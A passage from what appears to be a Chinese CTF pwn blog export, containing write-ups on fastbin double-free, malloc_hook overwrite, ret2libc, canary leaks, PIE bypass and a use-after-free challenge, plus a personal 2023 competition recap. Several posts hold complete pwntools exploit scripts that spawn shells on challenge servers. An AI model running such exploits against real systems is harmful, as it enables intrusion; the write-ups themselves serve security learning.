p64(0x81) + p64(0))            # chunk#7 (0x81)            # this chunk is co-located with chunk#0, so we partially overwrite the fd pointer            # after this allocation will put a heap address in fastbin free list            init_note(0x68, b&#x27;a&#x27; * 255)            # freeing chunk#2 will put it in the unsorted bin and set the fd/bk pointers with libc address            free_note(2)            # chunk#8 (0x81)            # this chunk is a fake chunk which is located a little before chunk#2            # basically, we overwrite chunk#2&#x27;s size and partially its fd which is pointing to somewhere before malloc_hook            # the first 12 bits is fixed, but the next 4 bits have to be 1            init_note(0x68, b&#x27;b&#x27; * 0x10 + p64(0) + p64(0x71) + p16(0x1aed) + b&#x27;\\n&#x27;)            # launch double free attack            # fastbin free list (0x70): chunk#4 --&gt; chunk#3 --&gt; chunk#4            free_note(4)            free_note(3)            free_note(4)            # chunk#9 (0x71)            # this chunk is co-located with chunk#4, so we partially overwrite the fd pointer to somewhere before malloc_hook            init_note(0x60, p8(0x00) + b&#x27;\\n&#x27;)            # chunk#10 (0x71)            # this chunk is co-located with chunk#3            init_note(0x60, b&#x27;d&#x27; * 255)            # chunk#11 (0x71)            # this chunk is co-located with chunk#4            # after this allocation, address of chunk#2 will be put in the fastbin free list            init_note(0x60, b&#x27;f&#x27; * 255)            # chunk#12 (0x71)            # this chunk is co-located with chunk#2            # after this allocation, the address before malloc_hook will be put in the fastbin free list            init_note(0x60, b&#x27;\\n&#x27;)            # chunk#13 (0x7f)            # this chunk is located before __malloc_hook            init_note(0x60, b&#x27;\\n&#x27;)            # fix unsorted bin chunk#2 size to look like a non-fastbin chunk            # also overwrite bk pointer of chunk#2 which points to 16 bytes before __malloc_hook            # preparing for unsorted_bin_attack            edit_note(8, 0x29, b&#x27;b&#x27; * 0x10 + p64(0) + p64(0x91) + p64(0) + p8(0x00))            # chunk#14 (0x91)            # allocate a chunk from unsorted bin, so the __malloc_hook will be overwritten with a libc address            init_note(0x78, b&#x27;\\n&#x27;)            &#x27;&#x27;&#x27;            0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)            constraints:                [rsp+0x30] == NULL            &#x27;&#x27;&#x27;            # overwrite __malloc_hook partially to point to the one gadget            # the first 12 bits is fixed, but the next 12 bits have to be a52            edit_note(13, 0x13 + 3, b&#x27;\\x00&#x27; * 0x13 + p32(0xa5226a)[0:3])            # chunk#15            # trigger __malloc_hook            init_note(0x100, b&#x27;\\n&#x27;)            p.clean()            p.sendline(b&#x27;ls&#x27;)            p.recv(0)            p.interactive()            break        except EOFError:            p.close()        except:            print ( sys.stderr, traceback.format_exc())            break","categories":["heap"],"tags":["bin"]},{"title":"fastbin_attack","url":"/2023/09/01/fastbin-attack/","content":"fastbinfast_bin的范围:64位机器下属于fast_bin的chunk大小在0x20 – 0x80之间，每个bin链表之间以0x10字节递增，共计7条bin链；32位机器下为0x10 – 0x40，每个bin链表之间以0x8字节递增，共计7条。注意，上面的大小均是包含了chunk头的.\n每个bin是一个单链表，先进后出，所以在fast bin中只有fd指针会被使用。\nfastbin设计的初衷是为了方便小内存chunk的释放和重新分配 为了防止和相邻的chunk合并 所以位于fastbin中的free chunk的PREV_INUSE位不会被设置为0 始终为1(不会unlink)\n存放fastbin链表的是malloc_state结构体\nstruct malloc_state&#123;  /* Serialize access.  */  __libc_lock_define (, mutex);  /* Flags (formerly in max_fast).  */  int flags;  /* Set if the fastbin chunks contain recently inserted free blocks.  */  /* Note this is a bool but not all targets support atomics on booleans.  */  int have_fastchunks;  /* Fastbins */  mfastbinptr fastbinsY[NFASTBINS];  /* Base of the topmost chunk -- not otherwise kept in a bin */  mchunkptr top;  /* The remainder from the most recent split of a small request */  mchunkptr last_remainder;  /* Normal bins packed as described above */  mchunkptr bins[NBINS * 2 - 2];  /* Bitmap of bins */  unsigned int binmap[BINMAPSIZE];  /* Linked list */  struct malloc_state *next;  /* Linked list for free arenas.  Access to this field is serialized     by free_list_lock in arena.c.  */  struct malloc_state *next_free;  /* Number of threads attached to this arena.  0 if the arena is on     the free list.  Access to this field is serialized by     free_list_lock in arena.c.  */  INTERNAL_SIZE_T attached_threads;  /* Memory allocated from the system in this arena.  */  INTERNAL_SIZE_T system_mem;  INTERNAL_SIZE_T max_system_mem;&#125;;\ndouble_freeglibc对于fastbin的double_free检查是依靠于检测main_arena指向的chunk即位于链表头的chunk 如果要释放的chunk和位于链表头的chunk是同一个 那么就会触发double free终止进程\nif (SINGLE_THREAD_P)      &#123;\t/* Check that the top of the bin is not the record we are going to\t   add (i.e., double free).  */\tif (__builtin_expect (old == p, 0))\t  malloc_printerr (&quot;double free or corruption (fasttop)&quot;);\tp-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);\t*fb = p;      &#125;\n\n\ndebug()add(0x68,b&#x27;aaaa&#x27;)#chunk0add(0x68,b&#x27;aaaa&#x27;)#chunk1add(0x68,b&#x27;aaaa&#x27;)#chunk2for i in range(7):    add(0x68,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)for i in range(7):    delete(i+3)pause()delete(0)#free chunk0delete(1)#free掉chunk1来干扰链表结构delete(0)#double free chunk0\n\nfree chunk0:\npwndbg&gt; bintcachebins0x70 [  7]: 0x177a650 —▸ 0x177a5e0 —▸ 0x177a570 —▸ 0x177a500 —▸ 0x177a490 —▸ 0x177a420 —▸ 0x177a3b0 ◂— 0x0fastbins0x70: 0x177a250 ◂— 0x0Free chunk (fastbins) | PREV_INUSEAddr: 0x177a250Size: 0x71fd: 0x00\n\nfree chunk1:\nFree chunk (fastbins) | PREV_INUSEAddr: 0x177a250Size: 0x71fd: 0x00Free chunk (fastbins) | PREV_INUSEAddr: 0x177a2c0Size: 0x71fd: 0x177a250fastbins0x70: 0x177a2c0 —▸ 0x177a250 ◂— 0x0\n\ndouble free chunk0\nfastbins0x70: 0x177a2c0 —▸ 0x177a250 ◂— 0x177a2c0\n可以看到此时chunk0既位于链表头也位于链表尾\n如果我们再次申请一个0x68大小的chunk0 申请到的是位于链表头的chunk 但是此时还有一个chunk0在链表中\n那么打印出该堆块便可做到泄露heap_base\n在libc2.23下，还有一个常见的攻击手法malloc_hook，之后再写\nchunk_extend\n//gcc fastbin_chunk_extend.c -g -no-pie -o fastbin_chunk_extend#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;    void *chunk0, *chunk2;\tchunk0 = malloc(0x10);//0x10的chunk0\tmalloc(0x10);//0x10的chunk1\t\t*(unsigned long *)((unsigned long)chunk0 - 0x8) = 0x41;// edit chunk0的size域\tfree(chunk0);\t\tchunk2 = malloc(0x30);//0x30的chunk2 实现extend，用chunk2控制了chunk1的内容\t\t    return 0;&#125;\n\n未修改前的chunk0和chunk1\npwndbg&gt; x/20gx 0x4052900x405290:\t0x0000000000000000\t0x00000000000000210x4052a0:\t0x0000000000000000\t0x00000000000000000x4052b0:\t0x0000000000000000\t0x00000000000000210x4052c0:\t0x0000000000000000\t0x0000000000000000\n稍后申请的chunk2，拿捏了chunk1\npwndbg&gt; x/40gx 0x4052900x405290:\t0x0000000000000000\t0x00000000000000410x4052a0:\t0x0000000000000000\t0x00000000000000000x4052b0:\t0x0000000000000000\t0x0000000000000021#chunk1，但是在chunk2里0x4052c0:\t0x0000000000000000\t0x00000000000000000x4052d0:\t0x0000000000000000\t0x0000000000020d310x4052e0:\t0x0000000000000000\t0x00000000000000000x4052f0:\t0x0000000000000000\t0x00000000000000000x405300:\t0x0000000000000000\t0x00000000000000000x405310:\t0x0000000000000000\t0x00000000000000000x405320:\t0x0000000000000000\t0x00000000000000000x405330:\t0x0000000000000000\t0x00000000000000000x405340:\t0x0000000000000000\t0x00000000000000000x405350:\t0x0000000000000000\t0x00000000000000000x405360:\t0x0000000000000000\t0x00000000000000000x405370:\t0x0000000000000000\t0x00000000000000000x405380:\t0x0000000000000000\t0x00000000000000000x405390:\t0x0000000000000000\t0x00000000000000000x4053a0:\t0x0000000000000000\t0x00000000000000000x4053b0:\t0x0000000000000000\t0x00000000000000000x4053c0:\t0x0000000000000000\t0x0000000000000000\n\nfastbin_poisoning跟tcachebin的类似\n//gcc fastbin_poisoning.c -g -no-pie -o fastbin_poisoning#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;\t\tunsigned long fck[4];   printf(&quot;stack addr is %p\\n&quot;, fck);   unsigned long *ptr = malloc(0x10);   free(ptr);   fck[1] = 0x21;           // same with 0x20   ptr[0] = (unsigned long)fck; // edit fd pointer   printf(&quot;the original heap %p\\n&quot;, malloc(0x10));   printf(&quot;alloc to the stack %p\\n&quot;, malloc(0x10));    return 0;&#125;\nAllocated chunk | PREV_INUSEAddr: 0x602310Size: 0x21Free chunk (fastbins) | PREV_INUSEAddr: 0x602310Size: 0x21fd: 0x7fffffffe2d0Free chunk (fastbins) | PREV_INUSEAddr: 0x602310Size: 0x21fd: 0x7fffffffe2d0\n这里写入的是栈上的地址，也可以考虑写入bss段或者libc段，要看具体的利用手法\n该攻击方式也是malloc_hook攻击的前置手段\n前面的攻击手段，以后再来探索吧~\n","categories":["heap"],"tags":["bin"]},{"title":"Linux保护机制","url":"/2023/07/25/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/","content":"矛与盾NX数据不可执行。原理是将数据所在内存页标识为不可执行，防止因为程序运行出现溢出而使得攻击者的shellcode可能会在数据区尝试执行的情况。NX在咱屡战屡败的经典栈溢出实验中有接触过，NX是对栈和堆的一种保护机制。实验需要关闭NX和地址随机化，否则执行shellcode时，CPU就会抛出异常，而不是去执行恶意指令。Linux系统叫做NX，Windows系统中类似的机制叫DEP(Data Execute Prevention)。绕过方式：ret2libc 例题：[BJDCTF 2020]babyrop本题没给libc，如果给了libc可以采用elf&#x3D;ELF[‘libc.so’]直接读地址\nfrom pwn import*import sgtlibcelf=ELF(&#x27;/home/str1k3/桌面/babyrop&#x27;)#elf=ELF(&#x27;./libc.so&#x27;)p = remote(&#x27;1.14.71.254&#x27;,28013)pop_rdi_addr = 0x400733ret_addr = 0x4004c9main_addr = 0x4006ADputs_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]payload = b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*8+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendlineafter(&#x27;story!\\n&#x27;,payload)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\00&#x27;))log.info(&quot;puts addr is :%x&quot;%puts_addr)s = sgtlibc.Searcher()s.add_condition(&#x27;puts&#x27;,puts_addr)s.dump(db_index=6) # search libc , if returns multi-result ,default use index-0&#x27;s resultsystem_addr = s.get_address(sgtlibc.s_system)binsh_addr = s.get_address(sgtlibc.s_binsh)puts_addr_ = s.get_address(sgtlibc.s_puts)print(hex(system_addr), hex(binsh_addr), hex(puts_addr_))libc_base = puts_addr - puts_addr_system = libc_base + system_addrbin_sh = libc_base + binsh_addrpayload = b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*8 + p64(ret_addr) +p64(pop_rdi_addr)+p64(bin_sh)+p64(system)p.sendlineafter(&#x27;story!\\n&#x27;,payload)p.interactive()\n\n\n也可以用LibcSearcher，找出来的libc版本不一定对，多试几次贴个LibcSearcher的板子\nfrom pwn import *from LibcSearcher import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;) io = process(&#x27;./ezrop64&#x27;)#io = remote(&#x27;node3.anna.nssctf.cn&#x27;,28173)elf=ELF(&#x27;./ezrop64&#x27;)padding = 0x100+0x08pop_rdi_ret = 0x4012a3ret_addr =0x40101adef rl(a):    io.recvuntil(a)rl(b&#x27;0x&#x27;)puts_addr = int(io.recv(12), 16)print(hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)print(&#x27;puts_addr:&#x27;,hex(puts_addr))print(&#x27;libc_base:&#x27;,hex(libc_base))print(&#x27;system_addr:&#x27;,hex(system_addr))print(&#x27;bin_addr:&#x27;,hex(bin_addr))#gdb.attach(io)payload2 = b&#x27;a&#x27;* padding + p64(ret_addr)+ p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)io.sendline(payload2)io.interactive()\n\n\nStack Canary栈保护。栈溢出保护是一种缓冲区溢出攻击缓解手段。启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。简单来说就是通过验证cookie，来判断执行的代码是不是恶意代码。cannary通常可分为3类：1.Terminator canaries:由于字符串操作不当可造成栈溢出，而字符串可以被Null(“\\x00”)所截断，于是Terminator canaries将低位设置为”\\x00“,可以防止被泄露，也可以防止被伪造。截断字符还可包括CR(0x0d)、LF（0x0a）、EOF(0xff)。2.Randon canaries:为防止canary被攻击者猜到，Randon canaries通常在程序初始化时生成，并保存在相对安全的地方。随机数通常由&#x2F;dev&#x2F;urandom生成，有时也会使用当前时间的哈希。3.Randon XOR canaries:与Randon canaries类似，但多了一个XOR操作，这样无论是canary被篡改还是与之XOR的控制数据被篡改，都会发生错误。**例：[BJDCTF 2020]babyrop2 **查查保护gift给了格式化字符串漏洞，可以泄露canary尝试泄露canarycanary的值位于rbp-0x08处，即rbp-0x08 &#x3D; 0x20 - 0x08 &#x3D; 0x18在这里溢出exp\nfrom pwn import *from LibcSearcher import *io = remote(&quot;node4.anna.nssctf.cn&quot;,28668)elf = ELF(&quot;./bjdctf_2020_babyrop2&quot;)main_addr = elf.symbols[&#x27;main&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]vuln_addr = 0x400887#ROPgadgetrdi = 0x0000000000400993 #: pop rdi ; retio.sendline(&#x27;%7$p&#x27;)io.recvuntil(&quot;0x&quot;)canary = int(io.recv(16),16)#print hex(canary)#泄露puts函数地址payload = (0x20-0x08)*&#x27;a&#x27;+p64(canary)+&#x27;a&#x27;*8+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln_addr)io.sendlineafter(&quot;story!\\n&quot;,payload)puts_addr = u64(io.recv(6).ljust(8,&quot;\\x00&quot;))#ret2libclibc = LibcSearcher(&quot;puts&quot;,puts_addr)libc_base = puts_addr - libc.dump(&quot;puts&quot;)sys_addr = libc_base + libc.dump(&quot;system&quot;)bin_sh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = (0x20-0x08)*&#x27;a&#x27;+p64(canary)+&#x27;a&#x27;*8+p64(rdi)+p64(bin_sh_addr)+p64(sys_addr)io.sendlineafter(&quot;story!\\n&quot;,payload)io.interactive()\n\n\nPIE &#x2F; ASLR 地址随机化。就是保证同一个程序任意两次运行时的堆栈基址是不同的。如果堆栈基址不变会怎样？不变就可能被攻击，因为攻击者能确认程序的内存地址，然后通过覆盖返回地址在等手段执行恶意代码。咱屡战屡败的经典栈溢出实验就是通过覆盖返回地址执行恶意代码。点击图片可查看完整电子表格pie的特点：pie保护下，地址后三位不变，相对地址不变，可以利用该特点来绕过pie。例：[NISACTF 2022]ezpie存在溢出得到相对地址，即shell_addr &#x3D; main_addr + 0x80F - 0x770exp\nfrom pwn import *context.log_level = &#x27;debug&#x27;# p = process(&quot;./ezpie&quot;)io = remote(&#x27;1.14.71.254&#x27;, 28335)io.recvuntil(&#x27;0x&#x27;)main_addr = int(p.recv(8), 16)print(&#x27;[+]main_addr: &#x27;, hex(main_addr))shell_addr = main_addr + 0x80F - 0x770print(&#x27;[+]shell_addr: &#x27;, hex(shell_addr))payload = b&#x27;a&#x27;*(0x28 + 4) + p32(shell_addr)io.recvuntil(&quot;Input:\\n&quot;)io.sendline(payload)io.interactive()\n\nRelro只读重定位。设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT攻击。在Linux中有”Partial RELRO” “Full RELRO”两种模式，默认开启Partical RELRO，开启Partical RELRO时，GOT是可写的，开启 FULL RELRO 时，GOT表是只读的。 主要用来保护重定位表段对应数据区域，默认可写 Partial RELRO： got表不可写，got.plt可写 Full RELRO： got表，got.plt不可写  部分RELRO 易受到攻击，例如攻击者可以修改atoi.got为system.plt，进而输入&#x2F;bin&#x2F;sh\\x00获得shell完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。参考：https://www.zhihu.com/question/21249496FORTIFY在编译的时候检查源码是否存在缓冲区溢出等错误。简单地说，加了这个保护之后,一些敏感函数如read, fgets,memcpy, printf等等可能导致漏洞出现的函数都会被替换成__read_chk,__fgets_chk, __memcpy_chk, __printf_chk等。这些带了chk的函数会检查读取&#x2F;复制的字节长度是否超过缓冲区长度，通过检查诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，避免了格式化字符串跳过某些参数（如直接%7$x）等方式来避免漏洞出现。##BRATH程序运行时的环境变量，运行时所需要的共享库文件优先从该目录寻找，可以fake lib造成攻击。源码分享，来自《CTF竞赛权威指南——pwn篇》链接：https://pan.baidu.com/s/1r2v-73lAK-PlUQpAnPV4iw 提取码：1145 \n","categories":["basic"],"tags":["Linux"]},{"title":"CTF2023_by_str1k3","url":"/2024/01/01/CTF2023/","content":"推荐用手机阅读，图片太大了\nlong live and pwn去年一直没啥年终总结，把大一上那半年也一起写下用时间线来叙述吧，纪念一下参加过的Timelinesec招新(doge)(后面我太忙了寄掉了)\nlibc_start_main9月份就这样来到了这里，嗯，就这样。军训最后几天就遇上了that’s when the story began\n#include &lt;CTF.h&gt;第一场新生赛是西电的，赛题很新生友好，貌似moeCTF2023没有moeCTF2022新生向了（？），有点怀念一步一步搭环境的日子懵懵懂懂的第一次团体CTF，啥也不会，就干出来一点misc，但做得很开心非常好wp接下来打了场UNCTF，单人赛，做出来的基本是日烂的题，但是有400分，坐牢但开心的一场中间参加了团队的面试，感谢@g0at和@aposimport misc十月初貌似打了长安杯，啥也不会，拿到了火眼但是根本不会用:)最暴殄天物的一集\nremote Hor1zon debugger大概这个时候战队定下了名字，有了自己的logo，长安杯的时候第一次面基，这个时候跟活跃的师傅们已经挺熟的了\nfrom pwn import rop开始学点pwn，貌似在11、12月份到寒假都在跟ELF文件、Linux之类的打交道，之前没学过，很新鲜，学了不少却又没那么清晰  天权信安的catf1ag貌似是我和Hor1zon打的第一场非新生CTF，看到一个ezarm就寄了，还是啥也不会寒假参加了一波hws的初赛（寄）和山石的冬令营，学到很多，更进一步令人遗憾的是当时一起参加Hor1zon招新的已经剩下不多了。情人节当天收到了很棒的抽奖奖品，很帅很爱\npackage GDOUCTF有幸作为部分出题人参与了GDOUCTF2023的出题（其实只有奇怪的ELF是我写的），主要是因为docker一开始玩不明白，题的思路也挺烂的。倒是m神主持的random pwn让师傅们好好干了一波随机数hhh这里要吐槽一下校园网，支持就支持，怎么给的服务器这么拉，小范围测试就寄了，赛后奖金也消失了:(。这里要@g0at，你做的好啊，香啊，很香啊，指找到长亭、hackingclub、NSSCTF三方强力援助。总之是办成功了，而且在校内再找到一些志同道合的新人。\ndef CTFs&#x2F;trevels_p1吃着火锅唱着歌就把奖拿了，这多是一件美事啊第一场线下赛是闽盾杯的决赛渗透。第一次单人坐飞机出远门，福州不错的，就是住的太经济了，有点难绷去年初赛“网络安全没有开卷考”可以笑一年,更难绷的是队里的主力去打上海市赛了，剩下俩二进制手去闽盾签到体验+坐牢渗透，啥不会，没进去，KFC很好吃，福师大半日游。\n接下来好像就国赛了，初赛搞了个canary爆破不错的，麻将那题最难绷决赛去了桂林。从湛江坐绿皮火车到桂林坐了十一个小时\nfrom lifepwn import *success(&quot;火车通宵&quot;)\n跟华南的师傅们面基了两波，一次晚上约饭一次火车站，见到了中大华师的大佬们，桂电一日游pwn爆零,队友带我拿下三等奖回家)\nvoid how2heap&#x2F;how2web(time)整个暑假基本都在跟着how2heap项目、pwn竞赛指南和CTFwiki去看堆学堆，没有大佬带，硬啃，很难受但学到很多惊叹于计算机之美，沉溺于二进制之道\n还在线上听了binX的渗透课和山石的夏令营，感觉渗透没实操还是听了&#x3D;不会，但是熟悉了一些流程。\n打了蓝帽杯和羊城杯的初赛。羊城杯初赛是真的大开眼界，异构(risc-V)、musl-libc、自实现vm的opcode、pop&#x2F;push only的shellcode题目,这下真borden my Hor1zon了。\n还有就是本博客，也是在暑假的时候搭起来的，感觉还是需要记录下自己的学习，当种田来打理对我来说动力也不小。\ndef CTFs&#x2F;trevels_p2这个学期强度极高，再加上学校方面的东西，我只能说没把人打死就不错了，但是很开心开学直冲羊城杯决赛，跟着山石网科打的，但是awdp没什么贡献，有点小难受接下来是蓝帽杯的半决赛，广州飞贵阳有延误，晚到很多，但还好有时间睡觉。出了一题UAF，很舒服。打卡贵警\n然后去了ISCC线下，从阳江一路高铁到北京\nfrom lifepwn import *success(&quot;高铁通宵&quot;)\n打卡北理工。线下赛制我觉得还是不错的，就是高低地的设定有点高估参赛选手了，放题的时间也很怪，晚上的大模型注入挺好玩，就是时间不够。水报告把pwn题的点全水中了，帮队伍拿下三等奖，很舒服。回程珠海半日游，路过打卡珠吉大（现珠科）。路过横琴口岸。\n过了好像半个月又去了蓝帽杯总决赛，这次体验了一波787头等舱，不愧是梦想大灰机打卡公大（没有在校园里拍照有点可惜(可能不能拍？)）签下四个三等奖(乐),实景渗透菠菜网站，真不会玩。回来的时候因为大雾晚了一天回学校，正好遇上一架因为被投硬币晚飞的B-777才回来。\nfrom lifepwn import*success(&quot;飞机延误到第二天&quot;)\n两次北京没去成清北有点小遗憾\n然后打了金砖-一带一路，这个赛制和主办方都极其抽象，第一次觉得大专之间亦有差距()。下午awd另外一队吃着火锅唱着歌就用ssh把所有人的机子都橄榄了，我们这边上了个通防一直被check扣分（寄！），但是CTF分数高拿下银牌:)打卡武大,最羡慕的一集\n马不停蹄第二天直冲鹏城杯(那里有两个做了两天牢的队友)，别问，问就是坐牢也得一起。但是打卡鹏城实验室+大疆总部场景很帅很真，但我不会:)\n最后是CICS2023的复赛(队长@g0at都忘了什么时候打的哈哈哈)，由于有考试第二天早上才打积分赛猛冲选择+GPT-plc猛猛冲分，我是plc大师.jpg。下午玩车联网因为设备问题没看更多题比较可惜。第二天早上的跨境数据位更寄，还好g0at✌会点工业流量。下午渗透火电厂+积分赛。最后2v4以30名垫底进决赛，明年南京安排上。接触了车联网，看了三菱和西门子的plc，力压Redbud和binX（这场确实），海带最win的一集单人坐船过海峡+打卡真海大+跨年之战+第一次异地跨年。\nvoid exit()2023到此结束，明年接着开冲\n写于2024.1.1,于琼州海峡船上\n","categories":["发电"],"tags":["发电"]},{"title":"UAF","url":"/2023/08/24/UAF/","content":"直接上例题[NISACTF 2022]UAFchecksec，注意一下是32位\nstr1k3@ubuntu:~/Desktop$ checksec &#x27;/var/run/vmblock-fuse/blockdir/FsiUbs/UAF&#x27; [*] &#x27;/var/run/vmblock-fuse/blockdir/FsiUbs/UAF&#x27;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled\n先看main函数\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  int v3[4]; // [esp+8h] [ebp-10h] BYREF  v3[1] = __readgsdword(0x14u);  setbuf(stdin, 0);  setbuf(stdout, 0);  while ( 1 )  &#123;    while ( 1 )    &#123;      puts(&quot;1.create&quot;);      puts(&quot;2.edit&quot;);      puts(&quot;3.delete&quot;);      puts(&quot;4.show&quot;);      putchar(58);      __isoc99_scanf(&quot;%d&quot;, v3);      if ( v3[0] != 2 )        break;      edit();    &#125;    if ( v3[0] &gt; 2 )    &#123;      if ( v3[0] == 3 )      &#123;        del();      &#125;      else if ( v3[0] == 4 )      &#123;        show();      &#125;      else      &#123;LABEL_13:        puts(&quot;Invalid choice&quot;);      &#125;    &#125;    else    &#123;      if ( v3[0] != 1 )        goto LABEL_13;      create();    &#125;  &#125;&#125;\n很标准的菜单题，跟进每个函数看看\nint create()&#123;  int result; // eax  int v1; // ebx  char *v2; // eax  printf(&quot;you are creating the %d page\\n&quot;, i);  result = i;  if ( i &gt;= 0 ) //重要  &#123;    result = i;    if ( i &lt;= 9 )    &#123;      v1 = i;      (&amp;page)[v1] = (char *)malloc(8u);//chunk大小固定为0x8      if ( i )      &#123;        if ( i &lt;= 0 || i &gt; 9 )        &#123;          return puts(&quot;NO PAGE&quot;);        &#125;        else        &#123;          puts(&quot;Good cretation!&quot;);          return ++i;        &#125;      &#125;      else      &#123;        v2 = page;        *(_DWORD *)page = 1868654951;        v2[4] = 0;        *((_DWORD *)page + 1) = echo; //page + 1中的1是指1个字长，因为是32位程序，所以page + 1 = page + 4 bytes        puts(&quot;The init page&quot;);        return ++i;      &#125;    &#125;  &#125;  return result;&#125;\ncreat函数的重点有三处：1.创建chunk的时候采用的是++i，与其他输入index来创建的题有所不同2.能创建chunk0，因为“if ( i &gt;&#x3D; 0 )”3.注意注释中的page + 1处，意思就是page地址的下一个字长的内容更改为echo这个函数看看echo\nint __cdecl echo(char *s)&#123;  return puts(s);&#125;\nputs是个好东西\nunsigned int edit()&#123;  int v1; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &lt;= 0 || v1 &gt; i )  //注意这里并不能edit到chunk0  &#123;    puts(&quot;NO PAGE&quot;);  &#125;  else  &#123;    puts(&quot;Input your strings&quot;);    __isoc99_scanf(&quot;%s&quot;, (&amp;page)[v1]);  &#125;  return __readgsdword(0x14u) ^ v2;&#125;\nedit函数，就是输入你要编辑的chunk，然后再输入要更改的内容\nunsigned int show()&#123;  int v1; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 )  &#123;    if ( v1 &lt;= 0 || v1 &gt; i )      puts(&quot;NO PAGE&quot;);    else      echo((&amp;page)[v1]);  &#125;  else  &#123;    (*((void (__cdecl **)(char *))page + 1))(page); //这里也是page + 4 bytes  &#125;  return __readgsdword(0x14u) ^ v2;&#125;  \n这句代码的作用是什么？先执行指针所指向的地址的下一个字长的指令 接着用指针所指向的地址的内容当作先前执行的指令的参数所以当我们不对chunk内容进行任何溢出时，仅仅只是输入小于一个字长的数据时show函数就相当于调用了echo函数把chunk的内容puts了出来\nunsigned int del()&#123;  int v1; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &lt; 0 || v1 &gt; i )    puts(&quot;NO PAGE&quot;);  else    free((&amp;page)[v1]);  return __readgsdword(0x14u) ^ v2;&#125;\ndelete函数，这里就要讲讲UAF的成因了例如此处，假设已经申请了chunk0chunk0被free后，其指针并没有被清空此时申请chunk1而由于每一次申请的chunk大小都是0x8此时申请的page1大小小于等于page0系统就会把chunk0[已经被free，指针(page0)存入fastbin]的空间再次分配给chunk1即此时chunk0与chunk1共享空间因此可以实现利用page1控制chunk0即UAF，Use After Free\n这里有个小问题，我使用Ubuntu 20.04进行动调时page0会被存入tcache，但是仍然会被复用等研究tcache的时候再来补充\n回到本题思路NICO函数处存在一处system我们用edit函数修改chunk0的内容为 “sh\\x00\\x00”然后溢出到下一个字长 修改其内容为system的地址这样当我们执行show函数的时候 其就会使用chunk内的sh当作system函数的参数执行system(‘sh’)，拿到shell\n这里再解释一下为什么是 ‘sh\\x00\\x00’32位的程序一个字长只有4个字节 如果我们使用的是&#x2F;bin&#x2F;sh显然字节不够所以使用sh也能达成对应的操作 至于后面的两个\\x00 是为了填充字节 又不至于破坏sh字符串\nfrom pwn import *p = process(&#x27;./UAF&#x27;)#p = remote(&#x27;1.14.71.254&#x27;,28674)elf = ELF(&#x27;./UAF&#x27;)context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)NICO = 0x80484E0 def add_chunk():    p.recvuntil(b&#x27;:&#x27;)    p.sendline(b&#x27;1&#x27;)  def edit_chunk(index, string):    p.recvuntil(b&#x27;:&#x27;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;page\\n&#x27;)    p.sendline(str(index))    p.recvuntil(b&#x27;strings\\n&#x27;)    p.sendline(string)  def del_chunk(index):    p.recvuntil(b&#x27;:&#x27;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&#x27;page\\n&#x27;)    p.sendline(str(index))  def show_chunk(index):    p.recvuntil(b&#x27;:&#x27;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(b&#x27;page\\n&#x27;)    p.sendline(str(index)) def debug():    gdb.attach()    pause(p)#debug() add_chunk()del_chunk(0)add_chunk()edit_chunk(1, b&#x27;sh\\x00\\x00&#x27; + p32(NICO)) show_chunk(0) p.interactive()","categories":["heap"],"tags":["UAF"]},{"title":"ROPgadget","url":"/2023/08/10/ROPgadget/","content":"安装\nsudo apt-get install python-capstonegit clone https://github.com/JonathanSalwan/ROPgadget.gitcd ROPgadgetsudo -H python3 setup.py install\n一般使用\n┌──(str1d3r㉿str1k3Gwindows)-[~/Desktop]└─$ ROPgadget --binary &lt;file &gt; |grep &quot;&lt;gadget&gt;&quot;\n\n特殊情况给出一例题[CISCN 